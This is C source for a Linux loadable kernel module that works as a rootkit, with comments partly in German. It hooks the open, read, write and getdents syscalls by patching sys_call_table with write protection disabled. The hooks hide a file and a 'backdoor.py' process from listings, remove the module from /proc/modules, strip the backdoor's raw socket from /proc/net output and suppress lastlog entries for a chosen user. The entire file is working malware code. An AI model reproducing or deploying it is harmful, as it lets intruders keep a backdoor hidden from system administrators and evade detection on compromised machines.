#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/dcache.h>
MODULE_LICENSE("GPL");

struct linux_dirent{
    unsigned long d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char d_name[];
    /*char pad;
     char d_type;
     */
};


//Parameter
static char *program = "backdoor.py";
module_param(program,charp,S_IRUGO);

static char *kernel_version = "dont know";
module_param(kernel_version,charp,S_IRUGO);

static char *user = "noah";
module_param(user, charp, S_IRUGO);

static char *protocol = "raw";
module_param(protocol, charp, S_IRUGO);

static char *filename = "bla.py";
module_param(filename, charp, S_IRUGO);

static char *fdNum = "5";
module_param(fdNum, charp, S_IRUGO);
void **SCT;

static int flag=0;
static int flag_write=0;
static int read_flag=0;
static char socketNum[10];

static char pid[10];

//Own fgetc function
int fgetc_kernel(struct file* f, char * buffer, int index){
    int i = vfs_read(f,buffer+index,1,&f->f_pos);
    return i;
}
//Own strcmp function
int strcmp_kernel(char *s1, char *s2){
    while(*s1 && *s2){
        if(*(s1++) != *(s2++)){
            return -1;
        }
    }
    return 0;
    
}

//Own byteCopy function
void byteCopy(char *src, char *dst, size_t size){
    while(size != 0){
        *(dst++) = *(src++);
        size--;
    }
}

long (*readlink_org)(const char *path, char *buf, int size);

int (*getdents_org)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

int getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
    
    int res = getdents_org(fd, dirp, count);
    if(res==-1 || res == 0){
        return res;
    }
    
    
    struct linux_dirent *d;
    char *p = (char*)dirp;
    struct linux_dirent *sz = NULL;
    int pos = 0;
    int flag_i = 0;
    char entry[512];
    while(p < (char*)dirp + res){
        d = (struct linux_dirent *)p;
        if(flag==1){
            mm_segment_t old;
            old=get_fs();
            set_fs(KERNEL_DS);
            char *file = kmalloc(4096, GFP_KERNEL);
            if(file == NULL){
                printk("malloc Fehler\n");
                flag=0;
                return -1;
            }
            //Open /proc/*/cmdline
            strcat(file, "/proc/");
            strcat(file, d->d_name);
            strcat(file, "/cmdline");
            struct file *fl = filp_open(file, O_RDONLY, 0);
            if(fl==NULL || IS_ERR(fl)){
                kfree(file);
                set_fs(old);
            }
            else{
                memset(entry,0,512);
                int i = 0;
                while(fgetc_kernel(fl, entry,i)==1){
                    if(i==512){
                        break;
                    }
                    if(entry[i] == '\0'){
                        if(strcmp(entry, program)==0){
                            printk("GEFUNDEN\n");
                            //For netstat save d_name
                            memset(pid, 0, 10);
                            byteCopy((char*)d->d_name, (char *)pid, 10);
                            flag_i = 2;
                            printk("Pid is %s\n", pid);
                        }
                        else{ entry[i] = ' ';}
                    }
                    i++;
                }
                filp_close(fl,0);
                kfree(file);
                set_fs(old);
            }
        }
        
        if(strcmp_kernel(filename, d->d_name)==0||flag_i==2){
            //Case 1: Entry in array
            if(d == dirp){
                //Res sind anzahl an bytes
                //Also Laenge Eintrag abziehen
                res = res - d->d_reclen;
                byteCopy(p+ d->d_reclen, p, res);
                flag=0;
                return res;
                
            }else {
                //Ansonsten einfach die laenge von aktuellem Eintrag(den wir verstecken wollen) zur laenge des vorgaengers addieren
                sz->d_reclen += d->d_reclen;
                flag=0;
                return res;
            }
        }
        else {
            sz=d;
        }
        p += d->d_reclen;
    }
    return res;
    
}




size_t (*read_org)(int fd, void *buf, size_t count);

size_t read_hook(int fd, void *buf, size_t count){
    size_t res = read_org(fd, buf, count);
    
    
    if(strstr((char *)buf, "hello_lkm")!=NULL){
        char *buffer = (char*) buf;
        char *anfang;
        //"hello_lkm" is in the buffer
        while(buffer < (char*)buf+res){
            if(strcmp_kernel("hello_lkm", buffer)==0 ){
                //Beginning of buffer
                anfang = buffer;
                while(buffer < (char *)buf+res && *buffer != '\n'){
                    buffer++;
                }
                //at newline, add one
                buffer++;
                //copy in front
                byteCopy(buffer, anfang, (char *)buf - buffer + res);
                //change length
                res = res - (buffer - anfang);
                write_cr0(read_cr0() & (~0x10000));
                SCT[__NR_read] = read_org;
                write_cr0(read_cr0() | 0x10000);
                
                return res;
            }
            
            buffer++;
        }
    }else if(read_flag == 1 && strstr((char*)buf, socketNum)!=NULL){
        
        char *buffer = (char*) buf;
        char *nummer;
        
        //socketnum in buffer
        while(buffer < (char*)buf+res){
            if(strcmp_kernel(socketNum, buffer)==0 ){
                nummer = buffer;
                while(buffer >= buf && *buffer != '\n'){
                    buffer--;
                }
                //plus one then pointing at beginning of new line
                buffer++;
                
                while(nummer < (char *)buf+res && *nummer != '\n'){
                    nummer++;
                }
                //newline, plus one
                nummer++;
                //copy in front
                byteCopy(nummer, buffer, (char *)buf - nummer + res);
                //change length
                res = res - (nummer - buffer);
                write_cr0(read_cr0() & (~0x10000));
                SCT[__NR_read] = read_org;
                write_cr0(read_cr0() | 0x10000);
                printk("END: %s\n", (char *)buf);
                printk("Socket Num should be hidden\n");
                read_flag=0;
                
                
                return res;
            }
            
            
            buffer++;
        }
        
        
    }
    return res;
}

//write for lastlog

size_t (*write_org)(int fd, const void *buf, size_t count);

size_t write_hook(int fd, const void *buf, size_t count){
    
    if(strcmp_kernel(user,(char*) buf)==0){
        write_cr0(read_cr0() & (~0x10000));
        SCT[__NR_write] = write_org;
        write_cr0(read_cr0() | 0x10000);
        return count;
    }
    return write_org(fd, buf, count);
}


int (*open_org)(const char *pathname, int flags, int mode);

int open_hook(const char *pathname, int flags, int mode){
    if(strstr(pathname, "/proc/modules")!= NULL){
        //if found, hook read
        write_cr0(read_cr0() & (~0x10000));
        SCT[__NR_read] = &read_hook;
        write_cr0(read_cr0() | 0x10000);
    }
    if(strcmp_kernel(pathname, "/var/log/lastlog")==0){
        write_cr0(read_cr0() & (~0x10000));
        SCT[__NR_write] = &write_hook;
        write_cr0(read_cr0() | 0x10000);
        
    }
    if(strcmp_kernel(pathname, "/proc") ==0){
        //Jetzt checke auch getdents nach proc
        //strcmp_kernel checkt nur ob erste zeichen passen, deswegen muessen wir z.B. /proc/bla ausschliessen
        //mit strace habe ich herausgefunden, dass ps /proc oeffnet
        //Sonst wuerde bei jedem getdents versucht viele dateien zu oeffnen. Mit flag ist performance deutlich besser.
        if(pathname[5] == '\0'){
            
            flag=1;
            printk("Set flag 1\n");
            
        }
    }
    //open /proc/net/X
    if(strcmp_kernel(pathname, protocol)==0){
        //get Inode number of Socket with getdents
        //pid sollte jetzt gesetzt sein
        struct dentry bla;
        mm_segment_t old;
        old=get_fs();
        printk("PID is %s\n", pid);
        set_fs(KERNEL_DS);
        //readlink, to follow symlink (proc symlink that points to socket)
        //char path[512];
        char *path = kmalloc(512, GFP_KERNEL);
        int i =0;
        char *br;
        long length;
        memset(path, 0, 512);
        strcat(path, "/proc/");
        strcat(path, (char*)pid);
        strcat(path, "/fd/");
        //fdNum is a parameter
        strcat(path, fdNum);
        br = kmalloc(4096, GFP_KERNEL);
        memset(br,0,4096);
        //char br[512];
        //memset(br, 0,512);
        if(br == NULL){
            //Should never happen
            printk("Malloc problem\n");
            return open_org(pathname, flags,mode);
        }
        printk("Path: %s \n", path);
        length = readlink_org((char*)path,(char*)br, 511); //Nullbyte
        printk("length %d \n", length);
        if(length < 0){
            printk("Not Valid\n");
            kfree(br);
            set_fs(old);
            return open_org(pathname, flags,mode);
        }
        br[length] = '\0';
        printk("Socket: %s \n", (char*)br);
        //kfree(buffer);
        if(strstr((char*)br, "socket")==NULL){
            kfree(br);
            set_fs(old);
            return open_org(pathname, flags, mode);
        }
        //socket:[1234]
        char *klammer1 = (char*)br;
        char *klammer2 = (char*)br;
        while(*klammer2 != ']'){
            if(*klammer2 == '['){
                klammer1 = klammer2+1;
            }
            klammer2++;
        }
        *klammer2 = '\0';
        printk("Socket nummer %s\n", klammer1);
        //Search for this number in /proc/net/raw gesucht werden and delete line
        read_flag = 1;
        byteCopy(klammer1, socketNum, 10);
        write_cr0(read_cr0() & (~0x10000));
        SCT[__NR_read] = &read_hook;
        write_cr0(read_cr0() | 0x10000);
        kfree(br);
        set_fs(old);
        
    }
    return open_org(pathname, flags, mode);
    
}

int table(char *version){
    //Read /boot/System.map-kernel_version to get address of syscall_table

    mm_segment_t old;
    old=get_fs();
    set_fs(KERNEL_DS);
    char *file = kmalloc(4096, GFP_KERNEL);
    if(file == NULL){
        printk("malloc Fehler\n");
        return -1;
    }
    strcat(file, "/boot/System.map-");
    strcat(file, version);
    struct file *fl = filp_open(file, O_RDONLY, 0);
    if(fl==NULL || IS_ERR(fl)){
        printk("Fehler open System.map\n");
        return -1;
    }
    char entry[512];
    int i = 0;
    while(fgetc_kernel(fl, entry,i)==1){
        
        if(i==512){
            printk("This should never happen \n");
            return;
        }
        if(entry[i] == '\n'){
            //search for substring in string
            if(strstr(entry, "sys_call_table")!=NULL){
                printk("%s\n", entry);
                //Pointer at beginning of line
                char *li = entry;
                if(table == NULL){
                    filp_close(fl,0);
                    printk("Malloc \n");
                    kfree(file);
                    set_fs(old);
                    return -1;
                }
                //strtok not avaiable, use strsep
                //Sys_table_address then " "
                //strsep replaces " "  with \0
                char *address = strsep(&li, " ");
                printk("SCT address at: %s\n", address);
                
                //kstrtoul char* to number(hex)
                //SCT global variable
                kstrtoul(address, 16, &SCT);
                printk("%p\n", SCT);
                kfree(file);
                set_fs(old);
                filp_close(fl,0);
                return 0;
                
            }
            
            i=0;
        }
        
        
        i++;
    }
    
    kfree(file);
    set_fs(old);
    filp_close(fl,0);
    return -1;
    
}


static int __init
module_load(void){
    printk("Hello \n");
    if(table(kernel_version) == -1){
        printk("Damn, konnte systable nicht finden\n");
        return -1;
    }
    // bit 16 in CR0 Register to 0
    write_cr0(read_cr0() & (~0x10000));
    write_org = SCT[__NR_write];
    //SCT[__NR_write] == &write_hook;
    open_org = SCT[__NR_open];	
    read_org = SCT[__NR_read];
    printk("%p\n", SCT);
    SCT[__NR_open] = &open_hook;
    getdents_org = SCT[__NR_getdents];
    SCT[__NR_getdents] = &getdents_hook; 
    //set unwriteable again
    readlink_org = SCT[__NR_readlink];
    write_cr0(read_cr0() | 0x10000);
    
    return 0;
}

static void __exit
module_unload(void){
    //Just to be sure, only getdents should be hooked
    write_cr0(read_cr0() & (~0x10000));	
    SCT[__NR_open] = open_org;
    SCT[__NR_getdents] = getdents_org;
    SCT[__NR_write] = write_org;
    SCT[__NR_read] = read_org;
    write_cr0(read_cr0() | 0x10000);
    
}

module_init(module_load);
module_exit(module_unload);
